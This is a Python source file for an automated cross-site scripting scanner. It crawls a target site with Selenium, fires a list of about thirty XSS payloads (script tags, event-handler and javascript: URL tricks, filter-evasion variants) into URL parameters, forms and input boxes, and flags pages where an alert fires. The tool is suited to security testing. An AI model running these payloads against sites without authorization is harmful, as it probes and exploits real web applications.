import sys
import random
import string
import time
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import (
    StaleElementReferenceException,
    TimeoutException,
    WebDriverException,
    NoSuchElementException,
)
from concurrent.futures import ThreadPoolExecutor, as_completed


class AdvancedXSSScanner:
    def __init__(self, target_url, headless=True, timeout=20, max_depth=2, max_workers=5):
        self.target_url = target_url
        self.timeout = timeout
        self.max_depth = max_depth
        self.payloads = self.load_payloads()
        self.headless = headless
        self.visited_urls = set()
        self.vulnerabilities = []
        self.base_domain = urlparse(target_url).netloc
        self.max_workers = max_workers

    def _init_driver(self):
        options = Options()
        if self.headless:
            options.add_argument("--headless=new")
        options.add_argument("--disable-gpu")
        options.add_argument("--no-sandbox")
        options.add_argument("--disable-dev-shm-usage")
        options.add_argument("--log-level=3")
        options.page_load_strategy = "eager"
        driver = webdriver.Chrome(service=Service(), options=options)
        driver.set_page_load_timeout(self.timeout)
        return driver

    def load_payloads(self):
        base_payloads = [
            "<script>alert(1)</script>",
            "\"><script>alert(1)</script>",
            "'><img src=x onerror=alert(1)>",
            "<svg/onload=alert(1)>",
            "<body onload=alert(1)>",
            "<iframe src=javascript:alert(1)>",
            "<math><mi//xlink:href='data:text/html,<script>alert(1)</script>'>",
            "<script type=text/javascript>javascript:alert(document.domain);</script>",
            "<object data='javascript:alert(1)'>",
            "<link rel='stylesheet' href='javascript:alert(1)'>",
            "<video><source onerror='javascript:alert(1)'>",
            "<details open ontoggle=alert(1)>",
            "<a href='javas\u0000cript:alert(1)'>click</a>",
            "><script>alert(1)</script>",
            "\"><svg/onload=alert(1)>",
            "';!--\"<XSS>=&{()}",
            "</script><script>alert(1)</script>",
            "</style><script>alert(1)</script>",
            "<scr<script>ipt>alert(1)</scr<script>ipt>",
            "%3Cscript%3Ealert(1)%3C/script%3E",
            "<svg><script>alert(1)</script></svg>",
            "<img/src/onerror=alert(1)>",
            "<img src=x onerror=alert(1)>",
            "<a href=\"#\" onclick=alert(1)>click</a>",
            "<div onmouseover=alert(1)>hover me</div>",
            "#<img src=x onerror=alert(1)>",
            "#<svg/onload=alert(1)>",
            "<html><body><script>alert(1)</script></body></html>",
            "javascript:alert(1)\u0000",
            "<iframe src='javascript:alert(1)'>",
            "\" onfocus=alert(1) autofocus x=\"",
            "<script>alert(document.domain)</script>",
        ]
        return [p.replace("133", "".join(random.choices(string.digits, k=3))) for p in base_payloads]

    def log(self, msg, level="info"):
        symbols = {"info": "ℹ️", "success": "✅", "warn": "⚠️", "fail": "❌", "debug": "🐞"}
        ts = time.strftime("%H:%M:%S")
        print(f"[{ts}] {symbols.get(level, 'ℹ️')} {msg}")

    def wait_for_alert(self, driver):
        try:
            WebDriverWait(driver, 2).until(EC.alert_is_present())
            alert = driver.switch_to.alert
            text = alert.text
            alert.accept()
            return text
        except TimeoutException:
            return None

    def check_browser_console(self, driver):
        try:
            logs = driver.get_log("browser")
            for entry in logs:
                if "error" in entry["level"].lower() or "payload" in entry["message"].lower():
                    self.log(f"Console log detected: {entry['message']}", "debug")
                    return True
        except Exception:
            pass
        return False

    def crawl(self, driver, url, depth=0):
        if depth > self.max_depth or url in self.visited_urls:
            return []

        self.visited_urls.add(url)
        self.log(f"Crawling {url}", "debug")

        try:
            driver.get(url)
        except Exception as e:
            self.log(f"Failed to load {url}: {e}", "warn")
            return []

        hrefs = []
        try:
            attempts = 3
            for _ in range(attempts):
                try:
                    links = driver.find_elements(By.TAG_NAME, "a")
                    hrefs = []
                    for link in links:
                        try:
                            href = link.get_attribute("href")
                            if href and self.base_domain in href and href not in self.visited_urls:
                                hrefs.append(href)
                        except StaleElementReferenceException:
                            continue
                    break
                except StaleElementReferenceException:
                    time.sleep(0.5)  # reduced sleep
        except Exception as e:
            self.log(f"Error collecting links on {url}: {e}", "warn")
        return hrefs

    def test_params(self, driver, url):
        parsed = urlparse(url)
        query = parse_qs(parsed.query)
        for param in query:
            for payload in self.payloads:
                new_query = query.copy()
                new_query[param] = payload
                new_url = urlunparse(parsed._replace(query=urlencode(new_query, doseq=True)))
                self.log(f"Testing param '{param}' with payload: {payload}", "debug")
                try:
                    driver.get(new_url)
                    # replaced fixed sleep with wait for page ready state or alert (max 3 seconds)
                    WebDriverWait(driver, 3).until(
                        lambda d: d.execute_script("return document.readyState") == "complete"
                        or EC.alert_is_present()(d)
                    )
                except Exception as e:
                    self.log(f"Failed to load URL {new_url}: {e}", "warn")
                    continue
                if self.detect_xss(driver, payload, new_url):
                    self.vulnerabilities.append((new_url, param, payload))

    def test_forms(self, driver, url):
        try:
            driver.get(url)
            WebDriverWait(driver, 3).until(
                lambda d: d.execute_script("return document.readyState") == "complete"
            )
        except Exception as e:
            self.log(f"Failed to load form URL {url}: {e}", "warn")
            return

        try:
            attempts = 3
            for _ in range(attempts):
                try:
                    forms = driver.find_elements(By.TAG_NAME, "form")
                    break
                except StaleElementReferenceException:
                    time.sleep(0.5)
            else:
                forms = []
        except Exception as e:
            self.log(f"Failed to find forms on {url}: {e}", "warn")
            forms = []

        if not forms:
            self.log(f"No forms found on {url}", "debug")

        for form in forms:
            try:
                inputs = form.find_elements(By.TAG_NAME, "input") + form.find_elements(By.TAG_NAME, "textarea")
            except StaleElementReferenceException:
                continue
            try:
                submit_button = form.find_element(By.CSS_SELECTOR, "input[type=submit], button[type=submit]")
            except (NoSuchElementException, StaleElementReferenceException):
                submit_button = None

            for payload in self.payloads:
                for inp in inputs:
                    try:
                        inp.clear()
                        inp.send_keys(payload)
                    except Exception:
                        continue
                try:
                    if submit_button:
                        try:
                            submit_button.click()
                        except StaleElementReferenceException:
                            form = driver.find_element(By.TAG_NAME, "form")
                            submit_button = form.find_element(By.CSS_SELECTOR, "input[type=submit], button[type=submit]")
                            submit_button.click()
                    else:
                        form.submit()
                except Exception as e:
                    self.log(f"Failed to submit form on {url}: {e}", "warn")
                    continue
                # reduced sleep to 2 seconds + wait for alert or page ready state
                try:
                    WebDriverWait(driver, 2).until(
                        lambda d: d.execute_script("return document.readyState") == "complete"
                        or EC.alert_is_present()(d)
                    )
                except TimeoutException:
                    pass

                if self.detect_xss(driver, payload, url):
                    self.vulnerabilities.append((url, "form", payload))

    def test_inputs_without_form(self, driver, url):
        try:
            driver.get(url)
            WebDriverWait(driver, 3).until(
                lambda d: d.execute_script("return document.readyState") == "complete"
            )
        except Exception as e:
            self.log(f"Failed to load URL {url}: {e}", "warn")
            return

        try:
            attempts = 3
            for _ in range(attempts):
                try:
                    inputs = driver.find_elements(By.TAG_NAME, "input") + driver.find_elements(By.TAG_NAME, "textarea")
                    buttons = driver.find_elements(By.TAG_NAME, "button") + driver.find_elements(By.CSS_SELECTOR, "input[type=button], input[type=submit]")
                    break
                except StaleElementReferenceException:
                    time.sleep(0.5)
            else:
                inputs = []
                buttons = []
        except Exception as e:
            self.log(f"Failed to find inputs/buttons on {url}: {e}", "warn")
            inputs = []
            buttons = []

        if not inputs:
            self.log(f"No standalone input boxes found on {url}", "debug")
            return

        for payload in self.payloads:
            for inp in inputs:
                try:
                    inp.clear()
                    inp.send_keys(payload)
                except Exception as e:
                    self.log(f"Failed to fill input on {url}: {e}", "warn")
                    continue

            triggered = False
            for btn in buttons:
                try:
                    btn.click()
                    # replaced fixed sleep with dynamic wait for alert or ready state (max 3 sec)
                    try:
                        WebDriverWait(driver, 3).until(
                            lambda d: d.execute_script("return document.readyState") == "complete"
                            or EC.alert_is_present()(d)
                        )
                    except TimeoutException:
                        pass
                    if self.detect_xss(driver, payload, url):
                        self.vulnerabilities.append((url, "input_box", payload))
                        triggered = True
                        break
                except Exception as e:
                    self.log(f"Failed to click button on {url}: {e}", "warn")
                    continue

            if not triggered and self.detect_xss(driver, payload, url):
                self.vulnerabilities.append((url, "input_box", payload))

    def detect_xss(self, driver, payload, url):
        triggered = False
        if self.wait_for_alert(driver):
            triggered = True
        elif self.check_browser_console(driver):
            triggered = True
        # DOM changes detection disabled to avoid false positives

        if triggered:
            self.log(f"✅ Vulnerability found at {url}", "success")
        return triggered

    def run(self):
        driver = self._init_driver()
        urls_to_scan = [self.target_url]

        # Crawl URLs up to max depth
        for depth in range(self.max_depth):
            new_urls = []
            for url in urls_to_scan:
                found_urls = self.crawl(driver, url, depth)
                new_urls.extend(found_urls)
            urls_to_scan = new_urls

        self.log(f"Collected {len(self.visited_urls)} URLs to scan", "info")
        driver.quit()

        # Parallel scan of URLs
        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            futures = {executor.submit(self.scan_url, url): url for url in self.visited_urls}
            for future in as_completed(futures):
                url = futures[future]
                try:
                    future.result()
                except Exception as exc:
                    self.log(f"Exception occurred while scanning {url}: {exc}", "fail")

        self.log("Scan finished.", "info")
        if self.vulnerabilities:
            self.log("\n⚠️ Vulnerabilities found:", "warn")
            for vuln in self.vulnerabilities:
                self.log(f"URL: {vuln[0]} | Param/Form: {vuln[1]} | Payload: {vuln[2]}", "warn")
        else:
            self.log("No vulnerabilities found.", "info")

    def scan_url(self, url):
        driver = self._init_driver()
        try:
            self.test_params(driver, url)
            self.test_forms(driver, url)
            self.test_inputs_without_form(driver, url)
        finally:
            driver.quit()


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 xss_scanner.py <target_url>")
        sys.exit(1)
    target = sys.argv[1]
    # Increase max_workers for more parallelism (adjust as per your system resources)
    scanner = AdvancedXSSScanner(target, headless=True, timeout=20, max_depth=2, max_workers=8)
    scanner.run()
